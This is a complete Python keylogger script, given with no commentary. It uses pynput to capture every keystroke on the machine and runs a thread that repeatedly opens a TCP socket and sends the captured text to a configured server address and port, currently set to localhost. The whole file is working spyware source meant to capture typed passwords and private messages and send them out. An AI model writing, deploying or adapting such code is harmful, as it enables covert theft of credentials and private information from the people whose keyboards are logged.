import pynput.keyboard
import threading
import socket

log = ""
server_ip = "127.0.0.1"
server_port = 9999

def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

def send_logs():
    global log
    while True:
        if len(log) > 0:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server_ip, server_port))
            sock.send(log.encode())
            log = ""
            sock.close()

keyboard_listener = pynput.keyboard.Listener(on_press=callback_function)
with keyboard_listener:
    send_logs_thread = threading.Thread(target=send_logs)
    send_logs_thread.start()
    keyboard_listener.join()
